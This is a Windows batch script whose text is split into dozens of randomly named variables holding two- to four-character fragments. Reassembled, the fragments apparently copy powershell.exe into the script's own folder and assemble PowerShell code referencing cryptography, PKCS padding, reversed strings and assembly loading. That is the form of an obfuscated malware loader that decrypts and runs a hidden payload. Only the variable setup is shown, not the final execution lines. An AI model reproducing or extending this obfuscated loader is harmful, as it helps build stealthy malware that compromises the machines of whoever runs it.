@echo off
set "voHfUzORNW=:\"
set "JkyPKilXid=ow"
set "WHPcHhAIEz=rS"
set "hMnwJiTjUS= /"
set "CihcQaOjgJ=he"
set "mLEyFEdJPg=co"
set "TNnCnFGUhF=we"
set "VvYezVgaWE=\v"
set "upJhTCxTHK=he"
set "nAFZLuhoUF=we"
set "PBebnMhbOX=st"
set "khOoCmbSzu=in"
set "mIPdONGXRb=y "
set "YabrKTVTkZ= C"
set "DWdDMVsMKu=Po"
set "LSmoEhjcCU=po"
set "VqaoQRKFXL=ll"
set "EssqpmJmNL=nd"
set "WSNTFIAQuY=do"
set "dhbnHotfuH=32"
set "yTyKKXnMOr=rs"
set "vKhlSftDjK=1."
set "FYhlqiBQrO=0\"
set "CGJLpRuCDG=.e"
set "YRtYTbgeDW=em"
set "euRtvdWrQI=Sy"
set "YCmoMsjClA=s\"
set "tcHgKdJTKw=ws"
set "WGRyfjPBcR=Wi"
set "xTdcCMuZkJ=py"
set "mUhzowykaa=\W"
set "TwolADefIK=xe"
set "pNgZKSwHvq=ll"
set "rpKrteHRaT=cd"
set "PaGNzfLzrC= %~dp0"
set "AtdymShbpz=Fina"
set "mNreTWJMOk=7;$o"
set "njkZrsEHcA=pHFC"
set "SJqPCAfExW=PKCS"
set "gpXTJnfFjR='[-1"
set "rzVLWbMJiN=tsWi"
set "yVrYZFcvLH=] -j"
set "rDGXplJJgm=r) {"
set "bULceupQYX=ress"
set "WKqrexHOVQ=FC.D"
set "FhkwBQKIJq=[Sys"
set "qRqQtVnJKf=esMa"
set "pTgLxVpHJn=);$o"
set "qQnzAWxwzr=Bmor"
set "iaJsHmWQGl=CxOU"
set "tJtdfCgwsh=ing("
set "yxULWEGKLO=raph"
set "jLujnUpJuR='txe"
set "kGNcnpxsuj=KsLJ"
set "idLJldiGWJ=J = "
set "SpJlfuhRCd=sGUc"
set "kHnrKTStPx=rity"
set "uCbZfUMqSQ=C = "
set "dwdlhYFAUh=.Ass"
